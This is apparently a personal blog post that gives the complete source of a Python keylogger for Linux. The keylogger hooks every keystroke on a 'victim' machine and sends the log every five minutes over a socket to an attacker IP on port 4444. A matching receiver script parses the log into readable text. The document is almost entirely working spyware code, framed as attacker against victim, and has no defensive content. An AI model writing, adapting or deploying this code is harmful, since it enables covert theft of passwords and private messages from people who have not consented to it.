---
title: "Python Keylogger With Sockets"
date: 2023-04-14T10:46:32-05:00
draft: false
---
[Link to repo](https://github.com/darefitz/python-keylogger-with-sockets)

I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents.
The keylog content is also parsed to be presented neatly.

They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket.
keylogging script ran on victim's computer:


    #Python keylogger for linux and socket connection to send keylog
    #4/14/2023
    import socket
    import os
    import pyxhook
    import time

    def send_file():
        BUFFER_SIZE = 4096 # send 4096 bytes each time step

        host = "192.168.24.128" #ENTER YOUR RECEIVEING IP HERE
        port = 4444 #ENTER YOUR RECEIVING PORT HERE

        filename = "file.log"

        
        #create sender socket
        s = socket.socket()
        print(f"[+] Connecting to {host}:{port}")
        s.connect((host,port))
        print("[+] Connected.")
        with open(filename, "rb") as f:
            while True:
                #read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    #file transmit is done
                    break

                #send all to assure transmission
                s.sendall(bytes_read)
                #update progress bar
                ###progress.update(len(bytes_read))
        print("[+] File sent.")

        #close socket
        s.close()


    PATH = "~/Desktop/keyloggerproj/file.log" #ENTER PATH TO STORE KEYLOG
    #Tell keylogger where to store file:
    log_file = os.environ.get('pylogger_file', os.path.expanduser(PATH))

    #allow a cancel key for example purposes
    cancel_key = ord(os.environ.get('pylogger_cancel','`')[0])

    #allow clearing the log file on start, if pylogger_clean is defined
    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            #file does not exist or incorrect permissions 
            pass

    #create key event and saving it into log file
    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

    #create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    #set the hook
    new_hook.HookKeyboard()
    try:
        new_hook.start() #start the hook
    except KeyboardInterrupt:
        #use used cancel key
        pass
    except Exception as ex:
        #Write exceptions to the log file
        msg = 'Error while catching events:\n {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

    while True:
        time.sleep(300)
        send_file()

The receiving script opens a socket and allows connection, any files sent are parsed and saved locally as file.log

The receiving script:

    #Socket that accepts and parses keylog file
    #4/14/23

    import socket
    import os

    def parse_string(file_content):
        newString = ""
        for word in file_content.split():
            newString += word
            if "BackSpace" in word:
                newString = newString[:-10]
            if "P_Enter" in word:
                newString = newString[:-7]
                newString += ' '
            if "space" in word:
                newString = newString[:-5]
                newString += ' '
            if "period" in word:
                newString = newString[:-6]
                newString += '.'
            if "Return" in word:
                newString = newString[:-6]
                newString += '\n'
            if "Shift_L" in word:
                newString = newString[:-7]

            if "exclam" in word:
                newString = newString[:-6]
                newString += '!'
            if "at" in word:
                newString = newString[:-2]
                newString += '@'
            if "numbersign" in word:
                newString = newString[:-10]
                newString += '#'
            if "dollar" in word:
                newString = newString[:-6]
                newString += '$'
            if "percent" in word:
                newString = newString[:-7]
                newString += '%'
            if "asciicircum" in word:
                newString = newString[:-11]
                newString += '^'
            if "ampersand" in word:
                newString = newString[:-9]
                newString += '&'
            if "asterisk" in word:
                newString = newString[:-8]
                newString += '*'
            if "parenleft" in word:
                newString = newString[:-9]
                newString += '('
            if "parenright" in word:
                newString = newString[:-10]
                newString += ')'
        return newString

    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 4444

    #recieve 4096 bytes each time
    BUFFER_SIZE = 4096

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))

    s.listen(5)
    print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")
    while(1):

        client_socket, address = s.accept()

        print(f"[+] {address} is connected.")

        #recieve file info
        #recieve using client socket, not server socket
        #recieved = client_socket.recv(BUFFER_SIZE).decode()
        #filename = recieved
        #remove abs path
        #filename = os.path.basename(filename)

        filename = "file.log"

        #recieve file from the socket

        with open(filename, "w") as f:
            while True:
                #read 1024 bytes fromt he socket
                bytes_read = client_socket.recv(BUFFER_SIZE)
                #bytes_read.replace('\n', ' ')
                string_read = bytes_read.decode('utf-8')
                
                #for line in string_read.splitlines():
                    #print(line)
                    #if line == 'space':
                        #print("SPACE IS TRUE")

                string_read = string_read.replace('\n', ' ')
                fstring_read = string_read.replace('Space', '')
                #string_read = string_read.replace('P_Enter', '')
                #string_read = string_read.replace('space', '')


                print(f"{string_read}")
                if not bytes_read:
                    #nothing recieved file transmiting is done
                    break
                #write to file the bytes we recieve
                file_content = parse_string(string_read)
                f.write(file_content)


    client_socket.close()

Victim running keylog.py and after 5 min the log is sent:

![Victim running keylog.py](/keylog1.png)

Attacker running receive.py and receiving keylog contents after 5 min:

![Attacker running receive.py](/keylog2.png)

Seeing that the log was successfully received:
![received log](/keylog3.png)

Looking at the contents of the example after 5 min of use:
![example log](/keylog4.png)
